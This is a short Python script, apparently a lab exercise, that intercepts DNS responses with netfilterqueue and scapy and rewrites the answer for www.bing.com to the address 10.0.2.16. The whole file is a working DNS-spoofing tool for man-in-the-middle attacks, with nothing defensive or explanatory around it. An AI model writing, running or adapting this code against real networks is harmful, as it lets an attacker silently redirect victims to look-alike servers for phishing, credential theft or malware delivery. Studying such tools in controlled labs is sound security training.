#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # Get the packet payload
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname # Get the DNS query name
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet)) # Set the modified packet payload
            print("[+] Packet modified")

    packet.accept() # Accept the packet
    


    
queue = netfilterqueue.NetfilterQueue() # Create a NetfilterQueue object
queue.bind(0, process_packet) # Bind the queue to the process_packet function
queue.run() # Start the queue

